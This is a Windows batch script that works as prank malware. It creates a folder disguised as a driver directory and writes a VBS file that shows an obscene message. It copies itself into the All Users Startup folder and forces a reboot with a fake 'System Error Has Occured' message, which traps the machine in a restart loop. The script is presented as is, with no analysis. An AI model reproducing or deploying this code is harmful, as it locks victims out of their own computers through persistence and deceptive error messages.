   @echo off
   cls
   If Exist C:\APX_DRIVERS32\Q53As\kern45.vbs goto open
   If Not Exist C:\APX DRIVERS32\Q53As\kern45.vbs goto make

   :make
   md C:\APX_DRIVERS32
   cd c:\APX_DRIVERS32
   md Q53As
   echo MsgBox "U R Screwed MotherFucker" >> C:\APX_DRIVERS32\Q53As\kern45.vbs
   copy %0 C:\Docume~1\All Users\Start Menu\Programs\Startup\s.bat
   goto open

   :open
   start c:\APX_DRIVERS32\Q53As\kern45.vbs
   shutdown -r -t 3 -c "System Error Has Occured, Restarting"
